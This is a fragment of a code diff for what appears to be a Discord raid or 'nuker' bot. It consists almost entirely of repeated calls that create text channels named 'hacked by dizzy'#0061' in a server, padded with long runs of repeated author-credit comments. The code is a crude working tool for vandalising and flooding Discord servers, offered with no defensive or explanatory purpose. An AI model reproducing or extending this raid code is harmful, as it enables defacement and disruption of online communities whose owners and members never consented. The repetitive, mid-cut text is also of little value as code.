       type: "text"// by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061
-      type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+      type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-      type: "text"//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
-      type: "text"//by diizy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-      type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by diizy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+      type: "text"//by diizy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
       type: "text"//by diizy'#0061
